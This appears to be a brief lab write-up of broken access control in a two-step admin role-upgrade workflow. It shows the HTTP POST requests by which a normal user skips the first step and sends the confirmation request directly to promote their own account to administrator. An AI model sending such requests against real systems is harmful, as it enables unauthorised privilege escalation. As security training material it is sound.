Multi-step process with no access control

Observed admin workflow:

Step 1:

POST /admin-roles
username=carlos&action=upgrade

Step 2 (confirmation):

POST /admin-roles
action=upgrade&confirmed=true&username=carlos

Logged in as normal user and skipped Step 1.

Directly sent Step 2 request:

POST /admin-roles
action=upgrade&confirmed=true&username=wiener

Backend failed to enforce access control on the confirmation step.

Result: user wiener promoted to administrator.
